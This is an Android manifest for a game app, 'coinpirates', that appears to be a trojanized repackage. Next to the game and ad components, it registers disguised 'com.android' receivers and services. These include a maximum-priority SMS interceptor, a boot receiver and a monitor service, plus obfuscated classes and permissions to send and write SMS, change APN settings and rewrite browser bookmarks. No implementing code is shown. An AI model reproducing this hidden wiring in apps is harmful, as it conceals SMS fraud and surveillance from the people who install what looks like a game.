<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.nubee.coinpirates">
    <application android:icon="@drawable/icon" android:label="@string/app_name" android:theme="@android:style/Theme.Light.NoTitleBar">
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:label="@string/app_name" android:name=".TopActivity" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:label="@string/app_name" android:name="hB$zO" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:label="@string/app_name" android:name=".game.GameActivity" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="pirates"/>
                <data android:host="charge"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="com.admob.android.ads.AdMobActivity" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <receiver android:exported="true" android:name="com.admob.android.ads.analytics.InstallReceiver">
            <intent-filter>
                <action android:name="com.android.vending.INSTALL_REFERRER"/>
            </intent-filter>
        </receiver>
        <meta-data android:name="ADMOB_PUBLISHER_ID" android:value="a14d3784af47a14"/>
        <meta-data android:name="ADMOB_INTERSTITIAL_PUBLISHER_ID" android:value="a14d3784af47a14"/>
        <service android:name=".common.AnalyticsService">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </service>
        <meta-data android:name="APP_ID" android:value="9ade0d7e-2ac4-4efe-a7a2-3d2049584760"/>
        <meta-data android:name="CLIENT_PACKAGE" android:value="Package_Where_R.java_Is_Created"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.tapjoy.TJCOffersWebView"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.tapjoy.TapjoyFeaturedAppWebView"/>
        <receiver android:exported="true" android:name="com.tapjoy.TapjoyReferralTracker">
            <intent-filter>
                <action android:name="com.android.vending.INSTALL_REFERRER"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.android.SMSReceiver">
            <intent-filter android:priority="10000">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
                <action android:name="android.provider.Telephony.SMS_SENT"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.android.BootReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <category android:name="android.intent.category.HOME"/>
            </intent-filter>
        </receiver>
        <service android:name="com.android.MonitorService">
            <intent-filter>
                <action android:name="com.android.MonitorService"/>
            </intent-filter>
        </service>
        <receiver android:name="aV$fB"/>
    </application>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
</manifest>